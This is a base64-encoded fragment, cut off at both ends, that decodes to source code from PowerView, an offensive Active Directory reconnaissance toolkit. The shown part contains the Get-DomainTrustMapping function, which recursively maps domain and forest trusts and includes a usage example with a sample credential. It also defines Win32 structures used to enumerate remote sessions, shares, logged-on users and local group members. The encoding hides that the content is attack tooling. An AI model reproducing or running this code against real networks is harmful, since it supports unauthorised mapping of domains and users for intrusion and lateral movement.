J1c3RlZERvbWFpbiknIGlzIHVzZWQgaW5zdGVhZC4gSWYgdGhlIC1BUEkgZmxhZyBpcyBzcGVjaWZpZWQsIHRoZQpXaW4zMiBBUEkgRHNFbnVtZXJhdGVEb21haW5UcnVzdHMoKSBjYWxsIGlzIHVzZWQgdG8gZW51bWVyYXRlIGluc3RlYWQuCgouUEFSQU1FVEVSIEFQSQoKU3dpdGNoLiBVc2UgYW4gQVBJIGNhbGwgKERzRW51bWVyYXRlRG9tYWluVHJ1c3RzKSB0byBlbnVtZXJhdGUgdGhlIHRydXN0cyBpbnN0ZWFkIG9mIHRoZSBidWlsdC1pbgouTkVUIG1ldGhvZHMuCgouUEFSQU1FVEVSIExEQVAKClN3aXRjaC4gVXNlIExEQVAgcXVlcmllcyB0byBlbnVtZXJhdGUgdGhlIHRydXN0cyBpbnN0ZWFkIG9mIGRpcmVjdCBkb21haW4gY29ubmVjdGlvbnMuCgouUEFSQU1FVEVSIExEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gZmlsdGVyIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0cy4KCi5QQVJBTUVURVIgUHJvcGVydGllcwoKU3BlY2lmaWVzIHRoZSBwcm9wZXJ0aWVzIG9mIHRoZSBvdXRwdXQgb2JqZWN0IHRvIHJldHJpZXZlIGZyb20gdGhlIHNlcnZlci4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpblRydXN0TWFwcGluZyB8IEV4cG9ydC1DU1YgLU5vVHlwZUluZm9ybWF0aW9uIHRydXN0cy5jc3YKCk1hcCBhbGwgcmVhY2hhYmxlIGRvbWFpbiB0cnVzdHMgdXNpbmcgLk5FVCBtZXRob2RzIGFuZCBvdXRwdXQgZXZlcnl0aGluZyB0byBhIC5jc3YgZmlsZS4KCi5FWEFNUExFCgpHZXQtRG9tYWluVHJ1c3RNYXBwaW5nIC1BUEkgfCBFeHBvcnQtQ1NWIC1Ob1R5cGVJbmZvcm1hdGlvbiB0cnVzdHMuY3N2CgpNYXAgYWxsIHJlYWNoYWJsZSBkb21haW4gdHJ1c3RzIHVzaW5nIFdpbjMyIEFQSSBjYWxscyBhbmQgb3V0cHV0IGV2ZXJ5dGhpbmcgdG8gYSAuY3N2IGZpbGUuCgouRVhBTVBMRQoKR2V0LURvbWFpblRydXN0TWFwcGluZyAtTERBUCAtU2VydmVyICdQUklNQVJZLnRlc3RsYWIubG9jYWwnIHwgRXhwb3J0LUNTViAtTm9UeXBlSW5mb3JtYXRpb24gdHJ1c3RzLmNzdgoKTWFwIGFsbCByZWFjaGFibGUgZG9tYWluIHRydXN0cyB1c2luZyBMREFQLCBiaW5kaW5nIHRvIHRoZSBQUklNQVJZLnRlc3RsYWIubG9jYWwgc2VydmVyIGZvciBxdWVyaWVzLAphbmQgb3V0cHV0IGV2ZXJ5dGhpbmcgdG8gYSAuY3N2IGZpbGUuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpblRydXN0TWFwcGluZyAtTERBUCAtU2VydmVyICdQUklNQVJZLnRlc3RsYWIubG9jYWwnIHwgRXhwb3J0LUNTViAtTm9UeXBlSW5mb3JtYXRpb24gdHJ1c3RzLmNzdgoKTWFwIGFsbCByZWFjaGFibGUgZG9tYWluIHRydXN0cyB1c2luZyBMREFQLCBiaW5kaW5nIHRvIHRoZSBQUklNQVJZLnRlc3RsYWIubG9jYWwgc2VydmVyIGZvciBxdWVyaWVzCnVzaW5nIHRoZSBzcGVjaWZpZWQgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzLCBhbmQgb3V0cHV0IGV2ZXJ5dGhpbmcgdG8gYSAuY3N2IGZpbGUuCgouT1VUUFVUUwoKUG93ZXJWaWV3LkRvbWFpblRydXN0Lk5FVAoKQSBUcnVzdFJlbGF0aW9uc2hpcEluZm9ybWF0aW9uQ29sbGVjdGlvbiByZXR1cm5lZCB3aGVuIHVzaW5nIC5ORVQgbWV0aG9kcyAoZGVmYXVsdCkuCgpQb3dlclZpZXcuRG9tYWluVHJ1c3QuTERBUAoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBkb21haW4gTERBUCB0cnVzdCByZXN1bHQgZmllbGRzLgoKUG93ZXJWaWV3LkRvbWFpblRydXN0LkFQSQoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBkb21haW4gQVBJIHRydXN0IHJlc3VsdCBmaWVsZHMuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRG9tYWluVHJ1c3QuTkVUJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkRvbWFpblRydXN0LkxEQVAnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRG9tYWluVHJ1c3QuQVBJJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdORVQnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdBUEknKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRBUEksCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkTERBUCwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0FQSScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgICMga2VlcCB0cmFjayBvZiBkb21haW5zIHNlZW4gc28gd2UgZG9uJ3QgaGl0IGluZmluaXRlIHJlY3Vyc2lvbgogICAgJFNlZW5Eb21haW5zID0gQHt9CgogICAgIyBvdXIgZG9tYWluIHN0YXR1cyB0cmFja2VyCiAgICAkRG9tYWlucyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlN0YWNrCgogICAgJERvbWFpblRydXN0QXJndW1lbnRzID0gQHt9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydBUEknXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ0FQSSddID0gJEFQSSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydMREFQJ10gPSAkTERBUCB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkTERBUEZpbHRlciB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgIyBnZXQgdGhlIGN1cnJlbnQgZG9tYWluIGFuZCBwdXNoIGl0IG9udG8gdGhlIHN0YWNrCiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAkQ3VycmVudERvbWFpbiA9IChHZXQtRG9tYWluIC1DcmVkZW50aWFsICRDcmVkZW50aWFsKS5OYW1lCiAgICB9CiAgICBlbHNlIHsKICAgICAgICAkQ3VycmVudERvbWFpbiA9IChHZXQtRG9tYWluKS5OYW1lCiAgICB9CiAgICAkRG9tYWlucy5QdXNoKCRDdXJyZW50RG9tYWluKQoKICAgIHdoaWxlKCREb21haW5zLkNvdW50IC1uZSAwKSB7CgogICAgICAgICREb21haW4gPSAkRG9tYWlucy5Qb3AoKQoKICAgICAgICAjIGlmIHdlIGhhdmVuJ3Qgc2VlbiB0aGlzIGRvbWFpbiBiZWZvcmUKICAgICAgICBpZiAoJERvbWFpbiAtYW5kICgkRG9tYWluLlRyaW0oKSAtbmUgJycpIC1hbmQgKC1ub3QgJFNlZW5Eb21haW5zLkNvbnRhaW5zS2V5KCREb21haW4pKSkgewoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5UcnVzdE1hcHBpbmddIEVudW1lcmF0aW5nIHRydXN0cyBmb3IgZG9tYWluOiAnJERvbWFpbiciCgogICAgICAgICAgICAjIG1hcmsgaXQgYXMgc2VlbiBpbiBvdXIgbGlzdAogICAgICAgICAgICAkTnVsbCA9ICRTZWVuRG9tYWlucy5BZGQoJERvbWFpbiwgJycpCgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgIyBnZXQgYWxsIHRoZSB0cnVzdHMgZm9yIHRoaXMgZG9tYWluCiAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbgogICAgICAgICAgICAgICAgJFRydXN0cyA9IEdldC1Eb21haW5UcnVzdCBARG9tYWluVHJ1c3RBcmd1bWVudHMKCiAgICAgICAgICAgICAgICBpZiAoJFRydXN0cyAtaXNub3QgW1N5c3RlbS5BcnJheV0pIHsKICAgICAgICAgICAgICAgICAgICAkVHJ1c3RzID0gQCgkVHJ1c3RzKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICMgZ2V0IGFueSBmb3Jlc3QgdHJ1c3RzLCBpZiB0aGV5IGV4aXN0CiAgICAgICAgICAgICAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdMREFQJykgewogICAgICAgICAgICAgICAgICAgICRGb3Jlc3RUcnVzdEFyZ3VtZW50cyA9IEB7fQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZvcmVzdCddKSB7ICRGb3Jlc3RUcnVzdEFyZ3VtZW50c1snRm9yZXN0J10gPSAkRm9yZXN0IH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEZvcmVzdFRydXN0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgICAgICAgICAgICAgJFRydXN0cyArPSBHZXQtRm9yZXN0VHJ1c3QgQEZvcmVzdFRydXN0QXJndW1lbnRzCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRUcnVzdHMpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFRydXN0cyAtaXNub3QgW1N5c3RlbS5BcnJheV0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFRydXN0cyA9IEAoJFRydXN0cykKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICMgZW51bWVyYXRlIGVhY2ggdHJ1c3QgZm91bmQKICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkVHJ1c3QgaW4gJFRydXN0cykgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFRydXN0LlNvdXJjZU5hbWUgLWFuZCAkVHJ1c3QuVGFyZ2V0TmFtZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBtYWtlIHN1cmUgd2UgcHJvY2VzcyB0aGUgdGFyZ2V0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICREb21haW5zLlB1c2goJFRydXN0LlRhcmdldE5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVHJ1c3QKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblRydXN0TWFwcGluZ10gRXJyb3I6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIwojIEV4cG9zZSB0aGUgV2luMzJBUEkgZnVuY3Rpb25zIGFuZCBkYXRhc3RydWN0dXJlcyBiZWxvdwojIHVzaW5nIFBTUmVmbGVjdC4KIyBXYXJuaW5nOiBPbmNlIHRoZXNlIGFyZSBleGVjdXRlZCwgdGhleSBhcmUgYmFrZWQgaW4KIyBhbmQgY2FuJ3QgYmUgY2hhbmdlZCB3aGlsZSB0aGUgc2NyaXB0IGlzIHJ1bm5pbmchCiMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCiRNb2QgPSBOZXctSW5NZW1vcnlNb2R1bGUgLU1vZHVsZU5hbWUgV2luMzIKCiMgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTQXZvaWRVc2luZ1Bvc2l0aW9uYWxQYXJhbWV0ZXJzJywgU2NvcGU9J0Z1bmN0aW9uJywgVGFyZ2V0PSdwc2VudW0nKV0KCiMgZW51bSB1c2VkIGJ5ICRXVFNfU0VTU0lPTl9JTkZPXzEgYmVsb3cKJFdUU0Nvbm5lY3RTdGF0ZSA9IHBzZW51bSAkTW9kIFdUU19DT05ORUNUU1RBVEVfQ0xBU1MgVUludDE2IEB7CiAgICBBY3RpdmUgICAgICAgPSAgICAwCiAgICBDb25uZWN0ZWQgICAgPSAgICAxCiAgICBDb25uZWN0UXVlcnkgPSAgICAyCiAgICBTaGFkb3cgICAgICAgPSAgICAzCiAgICBEaXNjb25uZWN0ZWQgPSAgICA0CiAgICBJZGxlICAgICAgICAgPSAgICA1CiAgICBMaXN0ZW4gICAgICAgPSAgICA2CiAgICBSZXNldCAgICAgICAgPSAgICA3CiAgICBEb3duICAgICAgICAgPSAgICA4CiAgICBJbml0ICAgICAgICAgPSAgICA5Cn0KCiMgdGhlIFdUU0VudW1lcmF0ZVNlc3Npb25zRXggcmVzdWx0IHN0cnVjdHVyZQokV1RTX1NFU1NJT05fSU5GT18xID0gc3RydWN0ICRNb2QgUG93ZXJWaWV3LlJEUFNlc3Npb25JbmZvIEB7CiAgICBFeGVjRW52SWQgPSBmaWVsZCAwIFVJbnQzMgogICAgU3RhdGUgPSBmaWVsZCAxICRXVFNDb25uZWN0U3RhdGUKICAgIFNlc3Npb25JZCA9IGZpZWxkIDIgVUludDMyCiAgICBwU2Vzc2lvbk5hbWUgPSBmaWVsZCAzIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBwSG9zdE5hbWUgPSBmaWVsZCA0IFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBwVXNlck5hbWUgPSBmaWVsZCA1IFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBwRG9tYWluTmFtZSA9IGZpZWxkIDYgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIHBGYXJtTmFtZSA9IGZpZWxkIDcgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQoKIyB0aGUgcGFydGljdWxhciBXVFNRdWVyeVNlc3Npb25JbmZvcm1hdGlvbiByZXN1bHQgc3RydWN0dXJlCiRXVFNfQ0xJRU5UX0FERFJFU1MgPSBzdHJ1Y3QgJG1vZCBXVFNfQ0xJRU5UX0FERFJFU1MgQHsKICAgIEFkZHJlc3NGYW1pbHkgPSBmaWVsZCAwIFVJbnQzMgogICAgQWRkcmVzcyA9IGZpZWxkIDEgQnl0ZVtdIC1NYXJzaGFsQXMgQCgnQnlWYWxBcnJheScsIDIwKQp9CgojIHRoZSBOZXRTaGFyZUVudW0gcmVzdWx0IHN0cnVjdHVyZQokU0hBUkVfSU5GT18xID0gc3RydWN0ICRNb2QgUG93ZXJWaWV3LlNoYXJlSW5mbyBAewogICAgTmFtZSA9IGZpZWxkIDAgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIFR5cGUgPSBmaWVsZCAxIFVJbnQzMgogICAgUmVtYXJrID0gZmllbGQgMiBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQp9CgojIHRoZSBOZXRXa3N0YVVzZXJFbnVtIHJlc3VsdCBzdHJ1Y3R1cmUKJFdLU1RBX1VTRVJfSU5GT18xID0gc3RydWN0ICRNb2QgUG93ZXJWaWV3LkxvZ2dlZE9uVXNlckluZm8gQHsKICAgIFVzZXJOYW1lID0gZmllbGQgMCBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgTG9nb25Eb21haW4gPSBmaWVsZCAxIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBBdXRoRG9tYWlucyA9IGZpZWxkIDIgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIExvZ29uU2VydmVyID0gZmllbGQgMyBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQp9CgojIHRoZSBOZXRTZXNzaW9uRW51bSByZXN1bHQgc3RydWN0dXJlCiRTRVNTSU9OX0lORk9fMTAgPSBzdHJ1Y3QgJE1vZCBQb3dlclZpZXcuU2Vzc2lvbkluZm8gQHsKICAgIENOYW1lID0gZmllbGQgMCBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgVXNlck5hbWUgPSBmaWVsZCAxIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBUaW1lID0gZmllbGQgMiBVSW50MzIKICAgIElkbGVUaW1lID0gZmllbGQgMyBVSW50MzIKfQoKIyBlbnVtIHVzZWQgYnkgJExPQ0FMR1JPVVBfTUVNQkVSU19JTkZPXzIgYmVsb3cKJFNJRF9OQU1FX1VTRSA9IHBzZW51bSAkTW9kIFNJRF9OQU1FX1VTRSBVSW50MTYgQHsKICAgIFNpZFR5cGVVc2VyICAgICAgICAgICAgID0gMQogICAgU2lkVHlwZUdyb3VwICAgICAgICAgICAgPSAyCiAgICBTaWRUeXBlRG9tYWluICAgICAgICAgICA9IDMKICAgIFNpZFR5cGVBbGlhcyAgICAgICAgICAgID0gNAogICAgU2lkVHlwZVdlbGxLbm93bkdyb3VwICAgPSA1CiAgICBTaWRUeXBlRGVsZXRlZEFjY291bnQgICA9IDYKICAgIFNpZFR5cGVJbnZhbGlkICAgICAgICAgID0gNwogICAgU2lkVHlwZVVua25vd24gICAgICAgICAgPSA4CiAgICBTaWRUeXBlQ29tcHV0ZXIgICAgICAgICA9IDkKfQoKIyB0aGUgTmV0TG9jYWxHcm91cEVudW0gcmVzdWx0IHN0cnVjdHVyZQokTE9DQUxHUk9VUF9JTkZPXzEgPSBzdHJ1Y3QgJE1vZCBMT0NBTEdST1VQX0lORk9fMSBAewogICAgbGdycGkxX25hbWUgPSBmaWVsZCAwIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBsZ3JwaTFfY29tbWVudCA9IGZpZWxkIDEgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQoKIyB0aGUgTmV0TG9jYWxHcm91cEdldE1lbWJlcnMgcmVzdWx0IHN0cnVjdHVyZQokTE9DQUxHUk9VUF9NRU1CRVJTX0lORk9fMiA9IHN0cnVjdCAkTW9kIExPQ0FMR1JPVVBfTUVNQkVSU19JTkZPXzIgQHsKICAgIGxncm1pMl9zaWQgPSBmaWVsZCAwIEludFB0cgogICAgbGdybWkyX3NpZHVzYWdlID0gZmllbGQgMSAkU0lEX05BTUVfVVNFCiAgICBsZ3JtaTJfZG9tYWluYW5kbmFtZSA9IGZpZWxkIDIgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQoKIyBlbnVtcyB1c2VkIGluIERTX0RPTUFJTl9UUlVTVFMKJERzRG9tYWluRmxhZyA9IHBzZW51bSAkTW9kIERzRG9tYWluLkZsYWdzIFVJbnQzMiBAewogICAgSU5fRk9SRVNUICAgICAgID0gMQogICAgRElSRUNUX09VVEJPVU5EID0gMgogICAgVFJFRV9ST09UICAgICAgID0gNAogICAgUFJJTUFSWSAgICAgICAgID0gOAogICAgTkFUSVZFX01PREUgICAgID0gMTYKICAgIERJUkVDVF9JTkJPVU5EICA9IDMyCn0gLUJpdGZpZWxkCiREc0RvbWFpblRydXN0VHlwZSA9IHBzZW51bSAkTW9kIERzRG9tYWluLlRydXN0VHlwZSBVSW50MzIgQHsKICAgIERPV05MRVZFTCAgID0gMQogICAgVVBMRVZFTCAgICAgPSAyCiAgICBNSVQgICAgICAgICA9IDMKICAgIERDRSAgICAgICAgID0gNAp9CiREc0RvbWFpblRydXN0QXR0cmlidXRlcyA9IHBzZW51bSAkTW9kIERzRG9tYWluLlRydXN0QXR0cmlidXRlcyBVSW50MzIgQHsKICAgIE5PTl9UUkFOU0lUSVZFICAgICAgPSAxCiAgICBVUExFVkVMX09OTFkgICAgICAgID0gMgogICAgRklMVEVSX1NJRFMgICAgICAgICA9IDQKICAgIEZPUkVTVF9UUkFOU0lUSVZFICAgPSA4CiAgICBDUk9TU19PUkdBTklaQVRJT04gID0gMTYKICAgIFdJVEhJTl9GT1JFU1QgICAgICAgPSAzMgogICAgVFJFQVRfQVNfRVhURVJOQUwgICA9IDY0Cn0KCiMgdGhlIERzRW51bWVyYXRlRG9tYWluVHJ1c3RzIHJlc3VsdCBzdHJ1Y3R1cmUKJERTX0RPTUFJTl9UUlVTVFMgPSBzdHJ1Y3QgJE1vZCBEU19ET01BSU5fVFJVU1RTIEB7CiAgICBOZXRiaW9zRG9tYWluTmFtZSA9IGZpZWxkIDAgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIERuc0RvbWFpbk5hbWUgPSBmaWVsZCAxIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBGbGFncyA9IGZpZWxkIDIgJERzRG9tYWluRmxhZwogICAgUGFyZW50SW5kZXggPSBmaWVsZCAzIFVJbnQzMgogICAgVHJ1c3RUeXBlID0gZmllbGQgNCAkRHNEb21haW5UcnVzdFR5cGUKICAgIFRydXN0QXR0cmlidXRlcyA9IGZpZWxkIDUgJERzRG9tYWluVHJ1c3RBdHRyaWJ1dGVzCiAgICBEb21haW5Ta